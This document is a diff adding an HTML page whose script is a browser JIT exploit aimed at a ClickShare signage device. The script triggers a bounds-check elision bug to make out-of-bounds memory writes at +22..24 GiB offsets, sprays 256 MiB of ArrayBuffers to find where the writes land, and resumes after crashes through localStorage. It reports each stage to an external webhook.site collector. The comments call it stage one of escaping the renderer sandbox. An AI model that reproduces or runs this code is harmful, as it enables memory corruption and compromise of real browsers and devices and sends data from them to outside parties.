@@ -1,0 +1,93 @@
+<html><body><script>
+// ClickShare signage -- esc7: far-write MARKER-HUNT in the mapped +22..24 GiB region.
+// Proven facts baked in: elision survives CHANGING THE LITERAL VALUE (esc6: 0x100000000 -> +16GiB
+// crash, +22/+24GiB SURVIVED = mapped backing-store land) and dies on any other code edit (s4).
+// So: canonical poc body verbatim (esc6/dev7965_live), literal C baked per-variant via eval,
+// 256 MiB ArrayBuffer spray, scan Uint32 views after every write for the tagged Smi (0xA00/0x500).
+// HIT = controlled write into OUR backing store = stage 1 of sandbox-space exploitation.
+// Cursor in localStorage: crash -> renderer auto-reloads -> resume at next C.
+const SINK = 'https://webhook.site/ecd6d090-c08d-4d88-a30d-ea0baf115a6c';
+function beacon(t, v){
+  try { var i = new Image(); i.src = SINK + '?t=' + encodeURIComponent(t) + '&v=' + encodeURIComponent(String(v).slice(0,150)); } catch(e){}
+}
+var LS = null;
+try { LS = window.localStorage; LS.getItem('x'); } catch(e) { LS = null; }
+beacon('E7-load', 'ls=' + (!!LS));
+var fake = new Uint32Array(10);
+fake[0]=1; fake[1]=3; fake[2]=2; fake[3]=4; fake[4]=5; fake[5]=6; fake[6]=7; fake[7]=8; fake[8]=9;
+var tahir = 1;
+// --- 256 MiB backing-store spray (outside the cage, in the mapped far region) ---
+const NBUF = 64, BLEN = 1 << 20;              // 64 x 4 MiB = 256 MiB
+var bufs = [], views = [];
+for (var b = 0; b < NBUF; b++) {
+  var ab = new ArrayBuffer(BLEN);
+  var u = new Uint32Array(ab);
+  for (var w = 0; w < u.length; w++) u[w] = 0xCAFEBABE;
+  bufs.push(ab); views.push(u);
+}
+beacon('E7-spray', (NBUF * BLEN / 1048576) + 'MB');
+// --- canonical poc factory: literal C baked into eval'd source (typing identical to esc6) ---
+function mkpoc(C) {
+  var src = '(function poc(a) {' +
+    'var oob_array = new Array(5); oob_array[0] = 0x500;' +
+    'let just_a_variable = fake[0];' +
+    'let another_variable3 = fake[7];' +
+    'if (a % 7 == 0) another_variable3 = ' + C + ';' +
+    'another_variable3 = Math.max(another_variable3, tahir);' +
+    'another_variable3 = another_variable3 >>> 0;' +
+    'var index = fake[3];' +
+    'var for_phi_modes = fake[6];' +
+    'let c = fake[1];' +
+    'for (var i = 0; i < 10; i++) {' +
+      'if (a % 3 == 0) just_a_variable = c;' +
+      'if (a % 37 == 0) just_a_variable = fake[2];' +
+      'if (a % 11 == 0) just_a_variable = fake[8];' +
+      'if (a % 17 == 0) just_a_variable = fake[5];' +
+      'if (a % 19 == 0) just_a_variable = fake[4];' +
+      'if (a % 7 == 0 && i >= 5) { for_phi_modes = just_a_variable; just_a_variable = another_variable3; }' +
+      'if (i >= 6) { for (let j = 0; j < 5; j++) { if (a % 5 == 0) { index = for_phi_modes; oob_array[index] = 0x500; } } }' +
+      'for_phi_modes = c; c = just_a_variable;' +
+    '}' +
+    'return [index, BigInt(just_a_variable)];' +
+  '})';
+  return eval(src);
+}
+function warm(poc){
+  for (var i = 2; i < 0x500; i++) poc(i);
+  poc(7 * 5);
+  for (var i = 0; i < 50000; i++) poc(i % 500 + 2);
+}
+var hitn = 0;
+function scan(tag){
+  for (var b = 0; b < NBUF; b++) {
+    var u = views[b];
+    for (var w = 0; w < u.length; w++) {
+      var x = u[w];
+      if (x === 0xA00 || x === 0x500) { if (hitn++ < 4) beacon('HIT-store','at='+tag+' buf='+b+' off='+(w*4)+' val=0x'+x.toString(16)); }
+    }
+  }
+  if (hitn > 0) beacon('E7-hit-total','at='+tag+' n='+hitn);
+}
+// schedule: byte offsets +22..24 GiB, step 128 MiB (16 shots)
+var offs = [];
+for (var o = 22 * 1073741824; o <= 24 * 1073741824; o += 134217728) offs.push(o);
+var cur = 0;
+if (LS) { cur = +(LS.getItem('e7cur') || 0); }
+beacon('E7-plan', 'n=' + offs.length + ' cur=' + cur);
+function step(){
+  if (cur >= offs.length) { beacon('E7-done','swept'); return; }
+  var C = offs[cur];
+  cur++;
+  if (LS) { try { LS.setItem('e7cur', String(cur)); } catch(e){} }   // commit BEFORE the risky write
+  beacon('E7-shot','cur=' + (cur - 1) + ' C=0x' + (C / 4).toString(16));
+  setTimeout(function(){
+    try {
+      var poc = mkpoc(C);
+      warm(poc);
+      poc(35);                        // single fire: one elided store at elements + C*4
+    } catch (e) { beacon('E7-exc','C=' + C + ':' + String(e).slice(0,80)); }
+    setTimeout(function(){ scan('C' + (cur - 1)); setTimeout(step, 110); }, 90);
+  }, 90);
+}
+setTimeout(step, 110);
+</script></body></html>
